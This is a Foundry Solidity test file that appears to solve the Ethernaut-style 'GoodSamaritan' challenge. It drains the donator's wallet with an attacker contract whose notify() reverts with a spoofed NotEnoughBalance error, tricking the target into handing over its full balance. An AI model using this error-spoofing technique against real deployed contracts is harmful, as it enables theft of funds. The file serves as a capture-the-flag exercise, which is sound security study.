// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {GoodSamaritan} from "./Donator.sol";
import "./Coin.sol";
import "./Wallet.sol";
contract ExploitDonator is Test {
    GoodSamaritan donator;
    Coin coin;
    Wallet wallet;

    address user = makeAddr("user");
    function setUp() public {
        donator = new GoodSamaritan();
        coin = donator.coin();
        wallet = donator.wallet();
    }

    function testDrainDonatorFunds() public {
        vm.startPrank(user);

        while (_donatorBalance() > 0) {
            donator.requestDonation();
        }

        vm.stopPrank();

        assertEq(_donatorBalance(), 0);
    }

    function testAbuseNotificationToDrain() public {
        ExploitDrainer drainer = new ExploitDrainer();

        drainer.requestDonation(address(donator));
        assertEq(_donatorBalance(), 0);
    }

    function _donatorBalance() internal view returns (uint256) {
        return Coin(coin).balances(address(wallet));
    }
}

contract ExploitDrainer {
    error NotEnoughBalance();

    function requestDonation(address to) public {
        GoodSamaritan donator = GoodSamaritan(to);
        donator.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
